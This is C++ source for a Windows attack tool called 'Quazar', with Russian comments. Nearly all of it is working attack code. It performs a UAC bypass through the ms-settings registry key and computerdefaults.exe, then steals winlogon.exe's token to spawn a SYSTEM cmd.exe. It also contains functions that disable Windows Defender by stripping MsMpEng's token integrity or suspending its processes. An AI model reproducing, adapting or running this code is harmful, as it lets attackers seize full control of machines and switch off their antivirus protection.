#include <windows.h>
#include <winuser.h>
#include <iostream>
#include <conio.h>
#include <string>
#include "shlobj_core.h"
#include <process.h>
#include <Lmcons.h>
#include <Tlhelp32.h>
#include "sddl.h"
#include "securitybaseapi.h"
//#include "lazy_importer.hpp"

//auto Kernel32 = LI_FN(LoadLibraryA)("Kernel32.dll");
//auto advapi32 = LI_FN(LoadLibraryA)("Advapi32.dll");

using namespace std;
std::string get_username();
BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege);
void Disable();
void SuspendDef();


DWORD GetProcId(char* ProcName)
{
    PROCESSENTRY32   pe32;
    HANDLE         hSnapshot = NULL;

    pe32.dwSize = sizeof(PROCESSENTRY32);
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(hSnapshot, &pe32))
    {
        do {
            if (strcmp(pe32.szExeFile, ProcName) == 0)
                break;
        } while (Process32Next(hSnapshot, &pe32));
    }

    if (hSnapshot != INVALID_HANDLE_VALUE)
        CloseHandle(hSnapshot);

    DWORD ProcId = pe32.th32ProcessID;
    static char proc[50];
    return ProcId;
}

typedef LONG(NTAPI* NtSuspendProcess)(IN HANDLE ProcessHandle);
typedef LONG(NTAPI* NtResumeProcess)(IN HANDLE ProcessHandle);

int main(int argc, char* argv[])
{
    setlocale(LC_ALL, "RU");

    SetConsoleTitle("Quazar");

    string usr = get_username();
    if (usr == "СИСТЕМА" || usr == "SYSTEM")
    {
        //Disable(); // Функция запрещает Windows Defender сканировать файлы.
		//SuspendDef(); // Функция суспендит процесс Windows Defender, может вызвать зависание ПК, не советую использовать.
    }

    HKEY hKeyResult = NULL;
    DWORD dwValue = 0;
    std::string vaals = "testsss";
    TCHAR sKey[] = ("SOFTWARE\\Classes\\ms-settings\\shell\\open\\command");

    HKEY kas;
    RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", &kas);

    LONG lError;
    LONG lError2;
    if ((lError = RegOpenKeyExA(HKEY_CURRENT_USER, sKey, NULL, KEY_SET_VALUE, &hKeyResult)) == ERROR_SUCCESS)
    {
        DWORD Type = REG_DWORD;
        TCHAR sVarName[] = ("DelegateExecute");

        DWORD Type2 = REG_SZ;
        TCHAR sVarName2[] = ("");

        BYTE slump[1026];
        LPCSTR pData = (LPCSTR)argv[0];
        int dwSize = wcslen((LPWSTR)pData) * sizeof(WCHAR);
        memcpy((void*)slump, (const void*)pData, dwSize * sizeof(BYTE));


        RegSetValueExA(hKeyResult, sVarName, NULL, Type, (const BYTE*)&dwValue, sizeof(DWORD));
        RegSetValueExA(hKeyResult, NULL, 0, REG_SZ, (const BYTE*)slump, dwSize);

        RegCloseKey(hKeyResult);

        if (!IsUserAnAdmin())
        {
            system("computerdefaults.exe");
        }
        else
        {
            RegDeleteKey(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\ms-settings\\shell\\open\\command");
            std::cout << "True :)" << std::endl;
            Sleep(1000);

            printf("");
            char* pid_c = argv[0];
            DWORD PID_TO_IMPERSONATE = GetProcId((char*)"winlogon.exe");
            HANDLE tokenHandle = NULL;
            HANDLE duplicateTokenHandle = NULL;
            STARTUPINFO startupInfo;
            PROCESS_INFORMATION processInformation;
            ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
            ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
            startupInfo.cb = sizeof(STARTUPINFO);
            HANDLE currentTokenHandle = NULL;
            BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
            if (SetPrivilege(currentTokenHandle, "SeDebugPrivilege", TRUE))
            {
                printf("");
            }
            // Call OpenProcess(), print return code and error code
            HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE);
            if (GetLastError() == NULL)
                printf("");
            else
            {
                printf("%i\n", processHandle);
                printf("%i\n", GetLastError());
            }

            // Call OpenProcessToken(), print return code and error code
            BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);
            if (GetLastError() == NULL)
                printf("");
            else
            {
                printf("%i\n", getToken);
                printf("%i\n", GetLastError());
            }

            BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
            if (GetLastError() == NULL)
            {
                printf("");
                printf("[Quazar] Текущий пользователь: %s\n", (get_username()).c_str());
                printf("");
            }
            else
            {
                printf("%i\n", getToken);
                printf("%i\n", GetLastError());
            }

            BOOL duplicateToken = DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
            if (GetLastError() == NULL) {
                printf("");
            }
            else
            {
                printf("%i\n", duplicateToken);
                printf("%i\n", GetLastError());
            }

            //BOOL createProcess = LI_FN(CreateProcessWithTokenW).in(advapi32)(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Program Files\\Process Hacker 2\\ProcessHacker.exe", NULL, 0, NULL, NULL, (LPSTARTUPINFOW)startupInfo.dwFlags, &processInformation);
            BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, (LPSTARTUPINFOW)startupInfo.dwFlags, &processInformation);
            if (GetLastError() == NULL)
                printf("[Quazar] Процесс создан\n");
            else
            {
                printf("%i\n", createProcess);
                printf("%i\n", GetLastError());
                getchar();
            }
        }
        getchar();
    }
}


BOOL SetPrivilege(
    HANDLE hToken,          
    LPCTSTR lpszPrivilege,  
    BOOL bEnablePrivilege   
)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(
        NULL,            
        lpszPrivilege,   
        &luid))        
    {
        printf("%u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        printf("%u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        printf("\n");
        return FALSE;
    }

    return TRUE;
}

void Disable() {
    system("whoami");
    PSID psid;
    ConvertStringSidToSidA("S-1-16-0", &psid);
    int pid = GetProcId((char*)"MsMpEng.exe");
    void* handleWD = OpenProcess(0x00001000, 0, pid);
    void* currentToken;
    OpenProcessToken(handleWD, TOKEN_ALL_ACCESS, &currentToken);
    TOKEN_MANDATORY_LABEL tml;
    tml.Label.Sid = psid;
    void* tmlPtr = malloc(sizeof(tml));
    TOKEN_INFORMATION_CLASS TokenInformationClass;
    SetTokenInformation(currentToken, TokenIntegrityLevel, &tml, sizeof(tml) + GetLengthSid(psid));
}

void SuspendDef()
{
    int procisser = GetProcId((char*)"MsMpEng.exe");
    HANDLE hProcess = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, procisser);
    NtSuspendProcess _NtSuspendProcess = (NtSuspendProcess)GetProcAddress(GetModuleHandle("ntdll"), "NtSuspendProcess");
    _NtSuspendProcess(hProcess);

    int procisdef = GetProcId((char*)"MpCopyAccelerator.exe");
    HANDLE hProcess1 = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, procisdef);
    NtSuspendProcess _NtSuspendProcess1 = (NtSuspendProcess)GetProcAddress(GetModuleHandle("ntdll"), "NtSuspendProcess");
    _NtSuspendProcess1(hProcess1);
}


std::string get_username()
{
    TCHAR username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);
    std::string username_w(username);
    std::string username_s(username_w.begin(), username_w.end());
    return username_s;
}